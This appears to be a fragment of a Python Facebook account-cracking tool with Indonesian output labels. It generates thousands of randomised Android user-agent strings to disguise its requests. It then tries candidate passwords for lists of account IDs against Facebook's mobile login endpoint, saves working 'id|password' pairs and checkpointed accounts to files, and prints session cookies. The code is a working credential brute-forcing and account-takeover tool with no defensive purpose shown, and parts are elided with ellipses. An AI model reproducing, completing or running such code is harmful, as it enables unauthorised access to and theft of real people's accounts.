...
for xc in range(10000):
    ...
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(2, 16))}; {str(rc(realme))} Build/SP1A{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(95,100))}.0.{str(rr(4638,4999))}.{str(rr(74,150))} MobileSafari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(2, 16))}; {str(rc(realme))} Build/SP1A{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(95,100))}.0.{str(rr(4638,4999))}.{str(rr(74,150))} MobileSafari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]"
    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(2, 16))}; {str(rc(oppo))} Build/SP1A{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(95,100))}.0.{str(rr(4638,4999))}.{str(rr(74,150))} MobileSafari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]"
    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(2, 16))}; {str(rc(redmi))} Build/SP1A{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(95,100))}.0.{str(rr(4638,4999))}.{str(rr(74,150))} MobileSafari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]"
    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(2, 16))}; {str(rc(samsung))} Build/SP1A{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(95,100))}.0.{str(rr(4638,4999))}.{str(rr(74,150))} MobileSafari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]" 
    uateddy = random.choice([u1,u2,u3,u4,u5])
    prem.append(uateddy)
...
def validate(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f" {K2}•{H2} M.VALIDATE {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			po = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", data = data, headers = head, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f"[b yellow]Login Checkpoint [b white]").add(f"[yellow]{idf}|{pw}{P}")
				tree.add(f"[b purple]{ua}[white]")
				cetak(tree)
				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
				cp+=1
				break
				...
				tree = Tree(f"[b green]]Login Berhasil [b white]").add(f"[b green]{idf}|{pw}[b white]")
				tree.add(f"[b purple]{kukis}")
				cetak(tree)
				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
				break
			else:
...
def validatte(idf,pwv,url):
    global loop,ok,cp
    ses = requests.Session()
    rr = random.randint
    rc = random.choice
    prog.update(des,description=f" {K2}•{H2} VALIDATE {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    for pw in pwv:
        try:
            ua = rc(ugen)
